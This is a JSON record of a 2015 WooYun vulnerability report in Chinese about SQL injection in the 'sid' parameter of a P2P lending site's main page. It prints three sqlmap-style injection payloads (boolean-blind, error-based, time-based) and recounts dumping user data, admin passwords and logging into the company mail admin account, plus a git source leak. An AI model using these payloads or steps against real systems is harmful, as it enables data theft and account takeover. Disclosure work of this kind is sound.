{"id": 22457, "wybug_id": "wooyun-2015-0114741", "wybug_title": "p2p金融来钱网主站存在sql注入漏洞（可脱库，可导致企业邮箱沦陷）", "wybug_corp": "来钱网", "wybug_author": "littelfire", "wybug_date": "2015-05-18 11:05", "wybug_open_date": "2015-07-02 11:06", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-18：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-07-02：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 来钱网存在sql注入。 详细说明：  来钱网主站存在sql注入，利用注入可获取万余名用户信息，同时利用sql注入可获取企业邮箱管理员登陆口令。另外该站点还存在git源码泄露，利用该漏洞可读取的系统部分源码。   漏洞证明：  首先是注入点：\n\nmask 区域\n1.http://**.**.**/index.phpr=ZstockIndex/spall&ipo_id=80&page=1&order=0&sid=10006\n\n 注入点是sid\nPlace: GETParameter: sid    Type: boolean-based blind    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)    Payload: r=ZstockIndex/spall&ipo_id=80&page=1&order=0&sid=10006 RLIKE (SELECT (CASE WHEN (1116=1116) THEN 10006 ELSE 0x28 END))    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: r=ZstockIndex/spall&ipo_id=80&page=1&order=0&sid=10006 AND (SELECT 2324 FROM(SELECT COUNT(*),CONCAT(0x71726c7871,(SELECT (CASE WHEN (2324=2324) THEN 1 ELSE 0 END)),0x716d6d7771,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 OR time-based blind    Payload: r=ZstockIndex/spall&ipo_id=80&page=1&order=0&sid=-1249 OR 1958=SLEEP(5)\n利用注入可获取万余名用户账号信息：\n\n\n\n还可获取管理员明文口令\n\n通过email表可获取其163企业邮箱的相关信息\n\n通过获取的口令可登陆其service账号\n\n利用该口令还可登录其邮箱管理员账号：\n\n\n\n不再深入做了再赠送一个git源代码泄露\n\n可直接下载部分源代码：\n\n   修复方案：  过滤，过滤   版权声明：转载请注明来源 littelfire@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：15 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n     2015-05-18 11:20 |    \t\tsql小神 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:4        | 有些漏洞可以提，有些漏洞不可以提。)\t\t \n  好厉害    \n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 15, "Ranks": null}